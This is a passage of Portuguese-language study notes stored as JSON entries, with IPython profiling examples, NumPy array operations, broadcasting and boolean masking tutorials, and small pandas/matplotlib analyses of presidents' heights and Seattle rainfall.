{built-in method builtins.sum}\n        2    0.111    0.055    0.111    0.055 {method '__exit__' of 'sqlite3.Connection' objects}\n        1    0.011    0.011    0.878    0.878 <string>:1(<module>)\n        1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}\n        2    0.000    0.000    0.000    0.000 traitlets.py:3631(set)\n        1    0.000    0.000    0.000    0.000 traitlets.py:1527(_notify_observers)\n        1    0.000    0.000    0.878    0.878 {built-in method builtins.exec}\n        2    0.000    0.000    0.000    0.000 traitlets.py:718(_validate)\n        5    0.000    0.000    0.000    0.000 {built-in method builtins.hasattr}\n        2    0.000    0.000    0.000    0.000 traitlets.py:3474(validate)\n        2    0.000    0.000    0.000    0.000 traitlets.py:708(__set__)\n        2    0.000    0.000    0.000    0.000 traitlets.py:3624(validate_elements)\n        2    0.000    0.000    0.000    0.000 traitlets.py:727(_cross_validate)\n        2    0.000    0.000    0.000    0.000 traitlets.py:689(set)\n        1    0.000    0.000    0.000    0.000 {built-in method _thread.allocate_lock}\n        1    0.000    0.000    0.000    0.000 traitlets.py:1512(_notify_trait)\n        7    0.000    0.000    0.000    0.000 {built-in method builtins.isinstance}\n        2    0.000    0.000    0.000    0.000 traitlets.py:676(__get__)\n        2    0.000    0.000    0.000    0.000 traitlets.py:2304(validate)\n        1    0.000    0.000    0.000    0.000 traitlets.py:1523(notify_change)\n        1    0.000    0.000    0.000    0.000 history.py:839(_writeout_output_cache)\n        1    0.000    0.000    0.000    0.000 threading.py:299(__enter__)\n        2    0.000    0.000    0.000    0.000 traitlets.py:629(get)\n\n\n\nPERFIL DE LINHA A LINHA COM %lprun################################\n##############################################################\n\nTem que instalar atrav\u00e9s do powershell\npip install line_profiler \n\n\nIn [1]: def sum_of_lists(n):\n   ...:     total = 0\n   ...:     for i in range(5):\n   ...:         L = [j ^ (j >> i) for j in range(n)]\n   ...:         total += sum(L)\n   ...:     return total\n   ...:\n\nIn [2]: %load_ext line_profiler\n\nIn [4]: %lprun -f sum_of_lists sum_of_lists(50000)\nTimer unit: 1e-07 s\n\nTotal time: 0.140139 s\nFile: <ipython-input-1-7df61cafdd50>\nFunction: sum_of_lists at line 1\n\nLine #      Hits         Time  Per Hit   % Time  Line Contents\n==============================================================\n     1                                           def sum_of_lists(n):\n     2         1          7.0      7.0      0.0      total = 0\n     3         6         59.0      9.8      0.0      for i in range(5):\n     4    250005    1383407.0      5.5     98.7          L = [j ^ (j >> i) for j in range(n)]\n     5         5      17907.0   3581.4      1.3          total += sum(L)\n     6         1         14.0     14.0      0.0      return total\n\n"}, "memoria de perfil em uso %memit e %mprun": {"codigo": "pip install memory_profiler\n\n\nIn [7]: %load_ext memory_profiler\n\nIn [8]: %memit sum_of_lists(1000000)\npeak memory: 138.40 MiB, increment: 73.20 MiB\n\n\nPara uma descri\u00e7\u00e3o linha por linha do uso da mem\u00f3ria, podemos usar a m\u00e1gica %mprun. Infelizmente\nnaturalmente, essa m\u00e1gica funciona apenas para fun\u00e7\u00f5es definidas em m\u00f3dulos separados, em vez de\no notebook em si, ent\u00e3o come\u00e7aremos usando a m\u00e1gica do arquivo %% para criar um m\u00f3dulo simples\nchamado mprun_demo.py, que cont\u00e9m nossa fun\u00e7\u00e3o sum_of_lists, com uma adi\u00e7\u00e3o\nisso tornar\u00e1 nossos resultados de perfil de mem\u00f3ria mais claros:\n\nIn[12]: %load_ext memory_profiler\n\nIn[13]: %memit sum_of_lists(1000000)\npeak memory: 100.08 MiB, increment: 61.36 MiB\n\nIn[14]: %%file mprun_demo.py \ndef sum_of_lists(N): \n\ttotal = 0 \n\tfor i in range(5): L = [j ^ (j >> i) for j in range(N)]\n\t\t total += sum(L)\n\t\t del L # remove reference to L \n\treturn total \nOverwriting mprun_demo.py #Fazendo arquivo .py\n\nIn[15]: from mprun_demo import sum_of_lists \n%mprun -f sum_of_lists sum_of_lists(1000000)", "categoria": "python ciencia de dados handbook"}, "NumPy - introdu\u00e7\u00e3o": {"categoria": "python ciencia de dados handbook", "codigo": "Quando pensamos em lista, listas que s\u00e3o heterogeneas com tipos de dados distintos s\u00e3o mais \nlentos para processar, sendo assim temos o array, que faz um conjunto de dados de tipos\niguais serem processador de forma mais efici\u00eante.\n\n\nIn[6]: import array\nL = list(range(10))\nA = array.array('i', L) #O indica que \u00e9 tipo inteiro\n\n\nIn [22]: import array\n\nIn [23]: L = list(range(10))\n\nIn [24]: A = array.array('i', L)\n\nIn [25]: A\nOut[25]: array('i', [0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n\nIn [26]: import numpy as np\n\nIn [27]: #integer array\n\nIn [28]: np.array([1, 4, 2, 5, 3])\nOut[28]: array([1, 4, 2, 5, 3])\n\nIn [29]: np.array([3.14, 4, 2, 3])\nOut[29]: array([3.14, 4.  , 2.  , 3.  ])\n\nIn [30]: np.array([1, 2, 3, 4], dtype='float32')\nOut[30]: array([1., 2., 3., 4.], dtype=float32)\n\nIn [31]: np.array([range(i, i+3) for i in [2, 4, 6]])\nOut[31]:\narray([[2, 3, 4],\n       [4, 5, 6],\n       [6, 7, 8]])\n\nrange(i, i+3) = come\u00e7a no primeiro numeor 2, .... 2, 3, 4 e fecha o []\nsem seguida faz isso para todos os n\u00fameros dentro do in [2, 4, 6]\n\n\n\n\n\nCRIANDO MATRIZES DO ZERO###############################################\n################################################################\nEspecialmente para arrays maiores, \u00e9 mais eficiente criar arrays do zero usando roteamento.\ndentes integrados ao NumPy. Aqui est\u00e3o v\u00e1rios exemplos:\n\n\n\n\nCRIA UMA MATRIZ 3X5 DE N\u00daMEROS FLOAT CHEIA DE 1\n############################################################\nIn [34]: np.ones((3, 5), dtype=float)\nOut[34]:\narray([[1., 1., 1., 1., 1.],\n       [1., 1., 1., 1., 1.],\n       [1., 1., 1., 1., 1.]])\n\n\n\n\nCRIA UMA MATRIZ 3X5 CHEIA DE 3.14\n############################################################\nIn [36]: np.full((3,5), 3.14)\nOut[36]:\narray([[3.14, 3.14, 3.14, 3.14, 3.14],\n       [3.14, 3.14, 3.14, 3.14, 3.14],\n       [3.14, 3.14, 3.14, 3.14, 3.14]])\n\n\n\nCRIA UMA MATRIZ COM SEQUANCIA, COME\u00c7A NO 0 E TERMINA NO 20, DE 2 EM 2\n############################################################\n\nIn [38]: np.arange(0, 20, 2)\nOut[38]: array([ 0,  2,  4,  6,  8, 10, 12, 14, 16, 18])\n\n\n\nCRIA UMA MATRIZ 3X5 DE 5 VALORES IGUALMENTE SEPARADOS ENTRE 0 E1\n############################################################\n\nIn [40]: np.linspace(0, 1, 5)\nOut[40]: array([0.  , 0.25, 0.5 , 0.75, 1.  ])\n\n\n\nCRIA UMA MATRIZ DE 3X3 DE UMA DISTRIBUI\u00c7\u00c3O DE VALORES ALEAT\u00d3RIO ENTRE 0 E 1\n############################################################\n\nIn [42]: np.random.random((3, 3))\nOut[42]:\narray([[0.83811714, 0.86639156, 0.8402119 ],\n       [0.28550826, 0.62409087, 0.46466621],\n       [0.88450183, 0.71154883, 0.49417734]])\n\n\n\nCRIA UMA MATRIZ 3X3 DE UM VALOR PADR\u00c3O NORMALMENTE DISTRIBUIDO COM M\u00c9DIA \n0 E DESVIO PADR\u00c3O 1\n############################################################\n\nIn [44]: np.random.normal(0, 1, (3, 3))\nOut[44]:\narray([[ 1.57370524, -1.17894567,  0.96458258],\n       [-0.95097796,  1.88664109, -0.54737693],\n       [ 0.41448796, -0.20879726, -0.94985155]])\n\n\nCRIA UMA MATRIZ 3X3 DE INTEIROS ALEAT\u00d3RIOS DE [0, 10]\n############################################################\nOu no lugar de (3, 3) voc\u00ea pode usar size = 5, vai fazer uma matriz de uma linha 5 elementos\nIn [47]: np.random.randint(0, 10, (3, 3))\nOut[47]:\narray([[3, 8, 8],\n       [9, 5, 2],\n       [3, 5, 5]])\n\n\n\nCRIA UMA MATRIZ 3X3 IDENTIDADE\n############################################################\n\nIn [49]: np.eye(3)\nOut[49]:\narray([[1., 0., 0.],\n       [0., 1., 0.],\n       [0., 0., 1.]])\n\nIn [50]: np.empty(3)\nOut[50]: array([1., 1., 1.])\n"}, "NumPy - remodela\u00e7\u00e3o de matrizes": {"codigo": "np.arange =[1 2 3 4 5 6 7 8 9]\ngrid = np.arange(1, 10).reshape((3, 3))\nprint(grid)\n\n[[1 2 3]\n [4 5 6]\n [7 8 9]]\n\nx = np.array([1, 2, 3])\nx.reshape((1, 3))\n[[1,2, 3]]\n\nx.reshape((3, 1))\n[[1],\n[2],\n[3]]\n", "categoria": "python ciencia de dados handbook"}, "NumPy - concatena\u00e7\u00e3o e separa\u00e7\u00e3o de matrizes": {"categoria": "python ciencia de dados handbook", "codigo": "CONCATENA\u00c7\u00c3O DE ARRAY#################################################\n#######################################################################\nimport numpy as np\n\nCONCATENANDO ARRAY UNIDIMENCIONAIS###################################\nx = np.array([1,2,3])\ny = np.array([3,2,1])\nz = np.array([99,99,99])\n\nnp.concatenate([x, y])\narray([1, 2, 3, 3, 2, 1])\n\nnp.concatenate([x, y, z])\narray([1, 2, 3, 3, 2, 1, 99, 99, 99])\n\n\n\nCONCATENANDO ARRAY BI-DIMENSIONAL#####################################\ngrid = np.array([[1, 2, 3],\n\t[4, 5, 6]])\n\nnp.concatenate([grid, grid])\narray([[1, 2, 3], \n[4, 5, 6], \n[1, 2, 3], \n[4, 5, 6]])\n\nnp.concatenate([grid, grid], axis=1)\narray([[1, 2, 3, 1, 2, 3],\n [4, 5, 6, 4, 5, 6]])\nNESSA CASO AQUI A CONCATENA\u00c7\u00c3O DEVE SER VEITO PELA LINHA, OU SEJA, \nLINHA 1 + LINHA1 E LINHA2 + LINHA2\n\n\nCONCATENANDO ARRAY COM DIMEN\u00c7\u00d5ES DIFERENTES###########################\nx = np.array([1,2,3])\n\ny = np.array([[99],\n\t[99]])\n\ngrid = np.array([[9, 8, 7],\n\t[6, 5, 4]])\n\n\nnp.vstack([x, grid])\narray([[1, 2, 3],\n [9, 8, 7], \n[6, 5, 4]])\n\nnp.hstack([grid, y])\narray([[ 9, 8, 7, 99], \n[ 6, 5, 4, 99]])\n\n\nSEPARANDO ARRAYS #################################################\n####################################################################\n#####################################################################\n\n\nnp.split = O que ocorre aqui \u00e9 que o array original ser\u00e1 dividido da seguinte forma:\nos 3 primeiro itens, do 4 ao 5 e do 5 at\u00e9 o final.\n\n\nx = [1, 2, 3, 99, 99, 3, 2, 1]\nx1, x2, x3 = np.split(x, [3, 5])\n\nfaze um array de 16 itens e remodela para uma matriz\nnesse caso o \u00edndice[2] indica que a divis\u00e3o deve ocorrer a partir da segunda linha\n\n\ngrid = np.arange(16).reshape((4, 4))\narray([[ 0, 1, 2, 3], \n[ 4, 5, 6, 7],\n [ 8, 9, 10, 11], \n[12, 13, 14, 15]])\nupper, lower = np.vsplit(grid, [2])\nprint(upper)\nprint(lower)\n\n[[0 1 2 3] \n[4 5 6 7]]\n[[ 8 9 10 11]\n[12 13 14 15]]\n\nO que ocorre aqui \u00e9 que diz e que a divis\u00e3o ocorre a partir da segunda coluna,\ncomo se tivessa passado uma linha no meio da matriz no meio, uma linha horizontal\nseparando o lado esquerdo do direito\nlelf, right = np.hsplit(grid, [2])\nprint(left)\npirnt(right)\n[[ 0 1] \n[ 4 5] \n[ 8 9] \n[12 13]] \n\n[[ 2 3] \n[ 6 7] \n[10 11] \n[14 15]]\n\n\n\n\n"}, "NumPy - Computa\u00e7\u00e3o de matrizes - Fun\u00e7\u00f5es universais - opera\u00f5es": {"categoria": "python ciencia de dados handbook", "codigo": "####################################################################\n####################################################################\nNESSA EXEMPLO, O PYTHON DEMORA MUITO PARA PODE PROCESSAR UMA MAIOR \nQUANTIDADE DE DADOS, DEVIDO A SUA COMPILA\u00c7\u00c3O QUE VERIFICA QUE TIPO DE OBJETO\n\u00c9 PARA CADA LOOP\nimport numpy as np\n\n'''\nnp.random.seed(0), serve para que todos os n\u00fameros\ngerados aleatoriamente sejam os mesmo em todo o c\u00f3digo,\npro exemplo, se gerou aleatoriamente 1 2 3 4, se gerar \nnovamente, ser\u00e3o os mesmos n\u00fameros.\n\nnp.empty(len(values)) diz que fizemos um array de n\u00famero\nde itens j\u00e1 pre definidos para depois setar os itens\n\nvalor:output[posi\u00e7\u00e3o] = 1.0 / valor:values[pisi\u00e7\u00e3o]\n\nnp.random.randint, sorteia um valor entre 1 e 10 em um \narray unidimensional de 5 espa\u00e7os\n\n\n'''\n\nnp.random.seed(0)\n\ndef compute_reciprocals(values):\n\toutput = np.empty(len(values))\n\tfor i in range(len(values)):\n\t\toutput[i] = 1.0 / values[i]\n\treturn output\n\nvalues = np.random.randint(1, 10, size=5)\n\nprint(compute_reciprocals(values))\n\n\n\n\n\nNO CASO PODEMOS SUBSTITUIR TODO ESSE C\u00d3DIGO POR:\nVetorizado\n\nimport numpy as np\n\nnp.random.seed(0) #Todos os numeros random geradados sejam os mesmos\n\nvalues = np.random.randint(1, 10, size=5)\nprint(1.0 / values)\n\n\n\n#DIVIS\u00c3O ENTRE MATRIZES###############################################\n###################################################################\n\nimport numpy as np\n\nprint(np.arange(5))\nprint(np.arange(1, 6))\nprint(np.arange(5) / np.arange(1, 6))\n\n#ELEVA\u00c7\u00c2O NA MATRIZ ################################################\n###################################################################\nimport numpy as np\n\nx = np.arange(9).reshape((3, 3,))\n\n2 ** x\n\n\n\n\n#EXPLORANDO#######################################################\n##################################################################\nx = np.arange(4)\nprint(f'x =', x)\nprint(f'x + 5 =', x +5)\nprint(f'x - 5 =', x - 5)\nprint(f'x * 2 =', x *2)\nprint(f'x / 2 =', x / 2)\nprint(f'x // 2', x // 2)\nprint(f'-x = ', -x)\nprint(f'x ** 2 =', x ** 2) #elevado\nprint(f'x %  2 =', x % 2) #resto da divis\u00e3o\n\nx = [0 1 2 3]\nx + 5 = [5 6 7 8]\nx - 5 = [-5 -4 -3 -2]\nx * 2 = [0 2 4 6]\nx / 2 = [0.  0.5 1.  1.5]\nx // 2 [0 0 1 1]\n-x =  [ 0 -1 -2 -3]\nx ** 2 = [0 1 4 9]\nx %  2 = [0 1 0 1]\n\n+    np.add Addition (e.g., 1 + 1 = 2) \n-     np.subtract Subtraction (e.g., 3 - 2 = 1) \n-     np.negative Unary negation (e.g., -2) \n*     np.multiply Multiplication (e.g., 2 * 3 = 6) \n/     np.divide Division (e.g., 3 / 2 = 1.5) \n//    np.floor_divide Floor division (e.g., 3 // 2 = 1)\n**    np.power Exponentiation (e.g., 2 ** 3 = 8) \n%    np.mod Modulus/remainder (e.g., 9 % 4 = 1)\n\nVALOR ABSOLUTO######################################################\n#####################################################################\nx = np.array([-2, -1, 0, 1, 2])\nabs(x)\narray([2, 1, 0, 1, 2])\n\nx = np.array([3 -4j, 4 - 3j, 2 + 0j, 0 + 1j])\nprint(np.abs(x))\n\nsignifica raiz quadrada de (3 ** 2) + ( - 4 **2), isso para todos os intervalor.\n\n\nFUN\u00c7\u00d5ES TRIGONOM\u00c9TRICAS############################################\n###################################################################\nVamos fazer uma array de angulos\n \n\nimport numpy as np\n\n#Cria 3 numeros igualmente separados entre 0 e np.pi >> numero de pi\ntheta = np.linspace(0, np.pi, 3)\nprint(f'theta = {theta}')\nprint(f'sin(theta) = {np.sin(theta)}')\nprint(f'cos(theta) = {np.cos(theta)}')\nprint(f'tan(theta) = {np.tan(theta)}')\n\n\nFUN\u00c7\u00d5ES TRIGONOM\u00c9TRICAS INVERSAS ###################################\n##################################################################\n\n\nimport numpy as np\n\nx = [-1, 0, 1]\nprint(f'x = {x}')\nprint(f'arcsin(x) = {np.arcsin(x)}')\nprint(f'arccos(x) = {np.arccos(x)}')\nprint(f'arctan(x) = {np.arctan(x)}')\n\n\nEXPO\u00caNTES ##############################################\n####################################################################\n\nimport numpy as np\n\n\nx = [1, 2, 3]\nprint(f'x = {x}')\nprint(f'e^x = {np.exp(x)}') #calcula o exponencial natural de cada elemento\nprint(f'2^x = {np.exp2(x)}') # 2 ^ x\nprint(f'3^x = {np.power(3, x)}') # 3 ^ x\n\nLOGAR\u00cdTMOS #########################################################\n##################################################################\n\n\nimport numpy as np\n\n\nx = [1, 2, 4, 10]\nprint(f' x = {x}')\nprint(f' ln(x) = {np.log(x)}')\nprint(f' log2(x) = {np.log2(x)}')\nprint(f' log10(x) = {np.log10(x)}')\n\n\nx = [0, 0.001, 0.01, 0.1]\nprint(f'exp(x) - 1 = {np.expm1(x)}')\nprint(f'log(1 + x) = {np.log1p(x)}')\n\n\nFUN\u00c7\u00d5ES UNIVERSAIS ESPECIALIZADAS ####################################\n###################################################################\npip install scipy\n\n\nfrom scipy import special\n\nx = [1, 5, 10]\nprint(f'gama(x) = {special.gamma(x)}')\nprint(f'ln|gama(x) = {special.gammaln(x)}')\nprint(f'beta(x , ) = {special.beta(x, 2)}')\n\n\n\nfrom scipy import special\nimport numpy as np \n\nx = np.array([0, 0.3, 0.7, 1.0])\nprint(f'erf(x) = {special.erf(x)}')\nprint(f'erfc(x) = {special.erfc(x)}')\nprint(f'erfinv(x) = {special.erfinv(x)}')\n\n\n\nRECURSOS AVAN\u00c7ADOS DE UFUNC#########################################\n#####################################################################\n\nAs vezes queremos armazenas os dados obtidos em mem\u00f3ria permanentemente, \nent\u00e3o podemos armazenar em um novo array\n\nimport numpy as np\n\nx = np.arange(5)\ny = np.empty(5)\nnp.multiply(x, 10, out=y)\nprint(y)\n\n'''\ncria um array inicializados em zeros 0, \nnp.power eleva uma base 2 a cada x \ne faz isso de dois em dois\n'''\ny = np.zeros(10)\nnp.power(2, x, out= y[::2])\nprint(y)\n\n\nAGREGADOS ##################################################\n#####################################################################\n\nAs vezes voc\u00ea precisa fazer calculos com todos os elementos de uma matriz e deseja\nreduzir isso a um n\u00famero\n\nimport numpy as np\n\n#soma todos os itens da matriz e reduz a um n\u00famero\nx = np.arange(1, 6)\nnp.add.reduce(x)\nnp.multiply.reduce(x)\nnp.add.accumulate(x)\n#array([ 1, 3, 6, 10, 15])\nnp.addaccumulate(x)\n#array([ 1, 2, 6, 24, 120])\n\n'''\nGera um array de 1 a 5\ne multiplica cada item da linha da matriza pela numero inicial da linha\n1 x1, 1x2, 1x3, 1x4, 1x5\n2x1, 2x2, 2x3, 2x4, 2x5\n3x1, 3x2, 3x3, 3x4, 3x5\n......\n\n'''\nx = np.arange(1, 6)\nnp.multiply.outer(x, x)\narray([[ 1, 2, 3, 4, 5], \n[ 2, 4, 6, 8, 10], \n[ 3, 6, 9, 12, 15],\n[ 4, 8, 12, 16, 20], \n[ 5, 10, 15, 20, 25]])\n\n\nMIN, MAX, and tudo no meio disso ########################################\n#####################################################################\n\nSOMANDO VALORES NA MATRIZ############################################\nimport numpy as np\n\n'''\nGera um array de 100 espa\u00e7os com itens de pontos flutuantes de \n0.0 a 1.0, esse 0.0 e 1.0 j\u00e1 \u00e9 impl\u00edcito\n'''\n\nL = np.random.random(100) \nsum(L)\nnp.sum(L) #Essa fun\u00e7\u00e3o \u00e9 mais r\u00e1pida\n\n\n\nMINIMO E M\u00c1XIMO ######################################################\n\nmin(big_array), max(big_array)\n np.min(big_array), np.max(big_array), mp.sum(big_array)\nprint(big_array.min(), big_array.max(), big_array.sum())\n\nAGRGA\u00c7\u00c3O MULTIDIMENSIONAL###########################################\nimport  numpy as np\n\n\nm = np.random.random((3, 4))\nprint(m)\nm.sum() #soma tudo\nm.min(axis=0) #menor valor de cada coluna\nm.min(axix=1) #menor valor de cada linha\n\n\nnp.sum np.nansum Compute sum of elements \nnp.prod np.nanprod Compute product of elements \nnp.mean np.nanmean Compute median of elements \nnp.std np.nanstd Compute standard deviation \nnp.var np.nanvar Compute variance \nnp.min np.nanmin Find minimum value \nnp.max np.nanmax Find maximum value \nnp.argmin np.nanargmin Find index of minimum value \nnp.argmax np.nanargmax Find index of maximum value \nnp.median np.nanmedian Compute median of elements \nnp.percentile np.nanpercentile Compute rank-based statistics of elements \nnp.any N/A Evaluate whether any elements are true \nnp.all N/A Evaluate whether all elements are true"}, "pequena analise de dados - numpy, pandas, matplotlib": {"codigo": "import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt #jupyter = matplotlib #apenas\n'''\n\t1)Primeiro abrimos o arquivo como pandas, transeferindo os dados para uma\nvari\u00e1vel, a estrutura de dados ser\u00e1 igual do SQL.\n\t2)Selecionamos uma coluna(nome da coluna) e transformamos os dados\ndessa coluna em um array usando o numpy\n\t3)Usamos as fun\u00e7\u00f5es para encontrar os dados que precisamos.\n\t4)Usamos o usamos o hist(array) do plt, essa fun\u00e7\u00e3o vai contar\nquantas vezes cada valor aparece, ou seja, um agrupamento. O eixo\nX, ser\u00e1 as alturas e o eixo Y ser\u00e1 quantas vezes essas alturas \napareceram\n'''\n#1\ndata = pd.read_csv('C:/Users/pcleu/Documents/president_heights.csv')\n#2\nheights = np.array(data['height(cm)'])\n#3\nprint(f'Altura mediana: {heights.mean()}')\nprint(f'Desvio padr\u00e3o: {heights.std()}')\nprint(f'Altura m\u00ednima: {heights.min()}')\nprint(f'Altura m\u00e1xima: {heights.max()}')\nprint(f'25nd quartil: {np.percentile(heights, 25)}')\nprint(f'M\u00e9dia: {np.median(heights)}')\nprint(f'75nd quartil: {np.percentile(heights, 75)}')\n\n#4\nplt.hist(heights)\nplt.title('Distribui\u00e7\u00e3o de alturas dos Presidentes dos US')\nplt.xlabel('height(cm)')\nplt.ylabel('number')\nplt.show()\n\n\n", "categoria": "python ciencia de dados handbook"}, "NumPy - Computa\u00e7\u00e3o de matrizes - Broadcasting - transmiss\u00e3o": {"categoria": "python ciencia de dados handbook", "codigo": "import numpy as np\n'''\nPegamos 3 arrays diferentes, os n\u00fameros dentro deles podem ser somados\na + b, as matrizes s\u00e3o de mesma dimens\u00e3o, ent\u00e3o todos os numeros ser\u00e3o \nsomados em suas posi\u00e7\u00f5es a[1] com b[1], a[2] com b[2] ....\nm + a, as matriz 'a' tem apenas uma linha, e a matriz m tem \u00e9 3x3,\nent\u00e3o cada linha ser\u00e3 somada com a matriz 'a'.\na1 + b1, cada linha ser\u00e1 adicionado em todos os valores, o valor da coluna\nda matriz vertical\n'''\na = np.array([0, 1, 2])\nb = np.array([5, 5, 5])\nm = np.ones((3,3)) #Todos os n\u00fameros s\u00e3o 1\na1 = np.array([0, 1, 2]) #np.arange(3) #array horizontal\nb1 = np.array([0, \n\t\t\t\t1, \n\t\t\t\t2])[:, np.newaxis] #np.arange(3) array vertical\n\n\n#Soma todos os itens do array\nprint(a+b)\n'''[5, 6, 7]'''\n\n#O array menos se estende por todo array maior\nprint(m+a)\n'''[[1. 2. 3.]\n\t[1. 2. 3.]\n\t[1. 2. 3.]]\n'''\n\nprint(a1 + b1)\n'''[[0 1 2]\n\t[1 2 3]\n\t[2 3 4]\n'''\n\n\n\n\nCENTRALIZA\u00c7\u00c3O DE MATRIZES ###########################################\n###################################################################\n\nimport numpy as np\n\n'''\n\tAqui estamos centralizando os dados, fazemos uma matriz que\n\tcont\u00e9m a m\u00e9dia de cada coluna, para centralizar, precisamos\n\tsubtrair cada m\u00e9dia da coluna por cada item da coluna, \n\te formamos um matriz centralizada.\n'''\n\nx = np.random.random((10, 3))\n\nxmedia = x.mean(0)\nx_centrado = x - xmedia\n\n\n\nPLOTANDO UMA FUN\u00c7\u00c3O BI-DIMENCIONAL ####################################\n#######################################################################\n\n\nimport numpy as np\nimport matplotlib.pyplot as plt\n#cria 50 ponto igualmente espa\u00e7ado de 0 a 5\nx = np.linspace(0, 5, 50) #Comprido\ny = np.linspace(0, 5, 50)[:, np.newaxis] #coluna\n\n#Fun\u00e7\u00e3o z, o valor do elemento \u00e9 o valor da fun\u00e7\u00e3o\n#para coordenadas correspondentes 'x' e 'y'\n\nz = np.sin(x) ** 10 + np.cos(10 + y * x) * np.cos(x)\nprint(z)\n\n'''\n#1 Plota a matriz z como uma imagem. \n\t- origin = 'lower' define a origem\n\tda imagem no canto inferior esquerdo.\n\t- extent=[0, 5, 0, 5] define os limites gr\u00e1ficos nos eixos x, y\n\t-cmap='viridis' especifica as cores a serem usadas.\n#2 Aciciona uma barra de cores ao lado do gr\u00e1fico, que mostra a \nescala dos valores de 'z'\n\n#3 Exibe o gr\u00e1fico\n\n'''\nplt.imshow(z, origin = 'lower', extent=[0, 5, 0, 5], cmap='viridis')#1\nplt.colorbar()#2\nplt.show()#3\n"}, "Numpy - compara\u00e7\u00f5es, mascaras e l\u00f3gica booleana": {"categoria": "python ciencia de dados handbook", "codigo": "import numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n \nrainfall = pd.read_csv('C:/Users/pcleu/Documents/Seattle2014.csv')['PRCP'].values\ninches = rainfall / 254\nprint(inches.shape) #mostra quantos valors tem\n'''\n\tAgrupa os dados, o 40 \u00e9 como uma pixela\u00e7\u00e3o\n'''\nplt.hist(inches, 40);\nplt.show()\n\n\n\n\n#############################################################\n############################################################\nimport numpy as np\n\n\nx = np.array([1, 2, 3, 4, 5])\nprint(x < 3)\n#[ True  True False False False]\n\nprint(x > 3)\n#[False False False  True  True]\n\nprint(x <= 3)\n#[ True  True  True False False]\n\nprint(x >= 3)\n#[False False  True  True  True]\n\nprint(x != 3)\n#[ True  True False  True  True]\n\nprint(x == 3)\n#[False False  True False False]\n\nprint((2 * x) == (x ** 2))\n\n\n\n== np.equal\n!= np.not_equal\n< np.less\n<= np.less_equal\n> greater\n>= greater_equal\n\n\n\n\nTRABALHANDO COM MATRIZES BOOLEANAS##################################\n#####################################################################\n\nimport numpy as np\n\n\nrng = np.random.RandomState(0)\nx = rng.randint(10, size=(3, 4))#numero aleat\u00f3rios de 0 a 10\n'''\n#1 Conta quantos elementos na matriz 'x' que s\u00e3o menores que 6.\n#2 Soma os elementos que s\u00e3o menores que 6.\n#3 Soma os elementos que s\u00e3o menores que 6 para cada linha.\n#4 Verifica que se h\u00e1 pelo menos um elemento em 'x' que \u00e9 maior que 8.\n#5 Verifica se todos os elementos s\u00e3o menores que 10\n#6 Verifica se todos os elementos s\u00e3o iguais a 6\n#7 Verifica se todos os elementos de cada linha da matriz s\u00e3o menores que 8.\n\n'''\n#1 \nprint(np.count_nonzero(x < 6))\n\n#2\nprint(np.sum(x < 6))\n\n#3\nprint(np.sum( x < 6, axis=1))\n\n#4 \nprint(np.any(x > 8))\n\n#5\nprint(np.any(x > 8))\n\n#6\nprint(np.all(x < 10))\n\n#7\nprint(np.all(x == 6))\n\n#8 \nprint(np.all(x < 8, axis=1))\n\n\n\n\nOPERA\u00c7\u00d5ES BOOLEANAS ###############################################\n###################################################################\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n \nrainfall = pd.read_csv('C:/Users/pcleu/Documents/Seattle2014.csv')['PRCP'].values\ninches = rainfall / 254\nprint(f'Quantos valores tem: {inches.shape}') #mostra quantos valors tem\n\n'''Soma quantos itens est\u00e3o em verdade com a l\u00f3gica, ou seja, \nquantos itens est\u00e3o dentro de 0.5 e 1.\n'''\n\nprint(f'N\u00famero de dia entre 0.5 e 1: {np.sum((inches > 0.5) & \n\t\t\t\t\t\t\t\t\t\t(inches < 1))}')\nprint(f'N\u00famero de dias sem chuva: {np.sum(inches == 0)}')\nprint(f'N\u00famero de dias com chuva: {np.sum(inches != 0)}')\nprint(f'N\u00famero de dias mais de 0.5: {np.sum(inches > 0.5)}')\nprint(f'''Dias chuvosos com menos de 0.1: {np.sum((inches > 0) & \n\t\t\t\t\t\t\t\t\t\t\t(inches < 0.2))}''')\n\n&\tnp.bitwise_and\n| \tnp.bitwise_or\n^\tnp.bitwise_xor\n~\tnp.bitwise_not\n\n\nMATRIZES BOOLEANAS E MACARAS#####################################\n#################################################################\nimport numpy as np\n\n'''\n1# podemos retornar os valores, dentro de uma array, \ntransformamos uma array booleano em array num\u00e9rico\ne agora somos livres para aplicar estat\u00edsticas nesses\nn\u00famero retornados\n'''\nrng = np.random.RandomState(0)\nx = rng.randint(10, size=(3, 4))\n#1\nprint(x[x < 5])\n\n\nNUMEROS[BOOL] - POSI\u00c7\u00d5ES TRUE FALSE E DISPONIBILIZA\u00c7\u00c3O DE DADOS ##############\n####################################################################\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n'''\n1# Importamos apenas os dados da coluna 'PRCP'\n\n2# Descobrimos quantos valores tem nesses dados: 365\n\n3, 4# - inches > 0 = uma matriz booleana.\n\t- inches[rainy] = uma matriz com os numer\u00f3s que est\u00e3o\n\t\tna posi\u00e7\u00e3o de True da matriz booleana.\n\t- \u00c9  a mesma coisa de x[x >0]. O primeiro x \u00e9 a matriz\n\t\tcom os dados, o segundo x \u00e9 a matriz booleana, \n\t\tretornar\u00e1 os dados apenas onde, nesse caso, True.\n\n5# Criamos uma matriz booleana, o arange(365) cria uma matriz \nunidimensional com 365 n\u00famero de 0 a 364, como o ver\u00e3o come\u00e7a no \n172th dia do ano, subtra\u00edmos todos os valores por 172, o ver\u00e3o\ntem dura\u00e7\u00e3o de 90 dias, ent\u00e3o, ele tem que ser maior que '0', \npois inicia em 0 e menor que 90, j\u00e1 que tem dura\u00e7\u00e3o de 90 dias\n\n6# Calculamos a m\u00e9dia booleana ((1+1+0+0) / 4), inches[rainy], int[bool]\n\n7# Calculamos a m\u00e9dia booleana inches[summer], int[bool_summer]\n\n8# Calculamos a m\u00e9dia booleana inches[rainy & ~summer], seja chuvoso fora \nde onde est\u00e1 True no summer, '~' \u00e9 nega\u00e7\u00e3o nesse caso\n\nNOTA: inches[summer], \n- A matriz inches \u00e9 feita por n\u00fameros.\n- A matriz summer \u00e9 feita por booleanos.\n- Ent\u00e3o os numeros que est\u00e3o na posi\u00e7\u00e3o de verdadeiros na\nmatriz de booleanos ser\u00e3o filtrados e disponibilizados.\n- inches[summer] = int[bool] = [1, 2, 